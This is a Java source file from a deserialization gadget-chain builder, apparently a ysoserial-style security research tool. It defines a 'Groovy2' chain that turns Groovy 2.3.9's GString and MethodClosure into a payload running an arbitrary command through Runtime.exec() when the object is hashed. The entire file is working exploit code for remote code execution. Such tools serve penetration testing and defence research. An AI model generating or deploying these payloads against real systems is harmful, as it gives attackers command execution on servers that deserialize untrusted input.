package org.ses.gadgetbuilder.chains1;

import org.codehaus.groovy.runtime.GStringImpl;
import org.codehaus.groovy.runtime.MethodClosure;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

/**
 * https://github.com/BofeiC/JDD-PocLearning/blob/main/src/main/java/jdk/payloadGroups/GroovyGStr.java
 */

@Authors(Authors.BofeiC)
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Impact(Impact.RCE)
public class Groovy2 extends GadgetChain<HashCodeTrampoline> {

    public Groovy2(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        MethodClosure closure = new MethodClosure(command, "execute");
        Reflections.setFieldValue(closure, "maximumNumberOfParameters", 0);

        GStringImpl gString = Reflections.createWithoutConstructor(GStringImpl.class);
        Object[] values = new Object[3];
        values[0] = closure;
        String[] strings = new String[3];
        strings[0] = "xnaisxiuw";

        Reflections.setFieldValue(gString, "values", values);
        Reflections.setFieldValue(gString, "strings", strings);

        return new TrampolineConnector(gString, gString);

    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "groovy.lang.GString.hashCode()\n" +
                "groovy.lang.GString.toString()\n" +
                "groovy.lang.GString.writeTo()\n" +
                "org.codehaus.groovy.runtime.MethodClosure.call()\n" +
                "groovy.lang.MetaClassImpl.call()\n" +
                "groovy.lang.MetaClassImpl.call()\n" +
                "groovy.lang.MetaClassImpl.call()\n" +
                "org.codehause.groovy.runtime.dgm$748.doMethodInvoke()\n" +
                "org.codehause.groovy.runtime.ProcessGroovyMethods.execute()\n" +
                "java.lang.Runtime.exec()";
    }
}
